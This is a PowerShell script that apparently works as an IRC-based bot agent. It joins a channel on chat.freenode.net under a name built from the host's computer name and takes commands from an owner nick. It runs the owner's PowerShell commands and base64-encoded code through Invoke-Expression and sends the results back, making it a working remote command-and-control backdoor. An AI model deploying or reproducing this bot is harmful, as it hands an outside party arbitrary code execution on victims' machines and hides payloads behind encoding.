$server = "chat.freenode.net"
$port   = 6667
$bot = "BOT-" + $env:COMPUTERNAME
$channel = "#SCRIPT-POWERSHELL"
$owner = "The-oo"
$date = Get-Date



# Connect-session
$TCPClient = new-object Net.Sockets.TcpClient
$TCPClient.Connect($server, $port)

[Net.Sockets.NetworkStream]$NetStream = $TCPClient.GetStream()
[IO.StreamWriter]$writer = new-object IO.StreamWriter($NetStream,[Text.Encoding]::ASCII)
[IO.StreamReader]$reader = new-object IO.StreamReader($NetStream,[Text.Encoding]::ASCII)
$writer.AutoFlush = $true

if($TCPClient.Connected){
    $writer.WriteLine("NICK " + $bot)
    sleep(0.1)
    $writer.WriteLine("USER " + $bot + " 0 * :" + $bot)
    sleep(0.1)
    $writer.WriteLine("JOIN " + $channel)
    sleep(0.1)
    $writer.WriteLine("PRIVMSG " + $owner + " :Bot demarre le " + $date)
    sleep(0.1)
    $writer.WriteLine("PRIVMSG " + $channel + " :J'ai bien rejoins le channel")
    sleep(0.1)
    $writer.Flush();
}
else{
    write-host "Problème de connection"    
}

$read = $reader.ReadLine()
$hostname = $read.Split(" ")[0]

do {
    $read = $reader.ReadLine();
    write-host $read 
   
    if($read -like '*End of /MOTD command*') {
        sleep 1
        $pass = $true
    } 

} until($pass)



do {
    $read = $reader.ReadLine();
    write-host $read  

    $user = $read.Split("!")[0]

    if(($read.Split("!")[0]) -like ':' + $owner) {
        if ($read -like '*stop_powershell*') {
            $writer.WriteLine("QUIT")
            $read = $reader.ReadLine();
            write-host $read
            break
        }
        if ($read -like '*command_irc*') {
            $value = $read -split "command_irc "
            Write-host $value[1]
            $writer.WriteLine($value[1])
        }
        if ($read -like '*:command_ps*') {
            $value = $read -split "command_ps "
            $command = $value[1]

            try {
                $result = Invoke-Expression $command
                $writer.WriteLine("PRIVMSG " + $owner + " :" + $result)
            } catch {
                $writer.WriteLine("PRIVMSG " + $owner + " :La commande suivante a echoue --> " + $command)
            }

        }
        if ($read -like '*:command_code*') {
            $value = $read -split "command_code "
            $code = $value[1]

            try {
                write-host $code

                $decoded = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($code))
                
                $result = Invoke-Expression $decoded
                $writer.WriteLine("PRIVMSG " + $owner + " :" + $result)
            } catch {
                $writer.WriteLine("PRIVMSG " + $owner + " :Le code suivante a echoue --> " + $code)
            }

        }


    }

    if ($read -like '*' + $hostname + '*') {
        $writer.WriteLine("PRIVMSG " + $owner + " :" + $read)
        Start-Sleep -Milliseconds 150
    }




} until($read -eq "")

$TCPClient.Close();

Remove-Variable pass
